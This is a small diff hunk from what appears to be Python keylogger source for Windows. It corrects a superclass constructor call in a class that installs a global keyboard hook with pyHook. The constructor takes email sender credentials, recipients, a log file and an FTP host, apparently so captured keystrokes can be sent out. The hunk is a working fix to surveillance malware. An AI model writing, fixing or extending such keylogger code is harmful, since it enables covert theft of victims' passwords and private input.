@@ -165,7 +165,7 @@ To specifically works on windows
 """
         # Constructor
         def __init__(self,method,sender,senderpass,receivers,logsfile,ftphost = None,maxchar = 10,terminatekey = 201):
-                Logger.__init__(method,sender,senderpass,receivers,logsfile,ftphost = None,maxchar = 10,terminatekey = 201)	# superclass constructor
+                Logger.__init__(self,method,sender,senderpass,receivers,logsfile,ftphost = None,maxchar = 10,terminatekey = 201)	# superclass constructor
                 self.hookman = pyHook.HookManager()
                 self.hookman.KeyDown = self.KeyPressed
                 self.hookman.HookKeyboard()
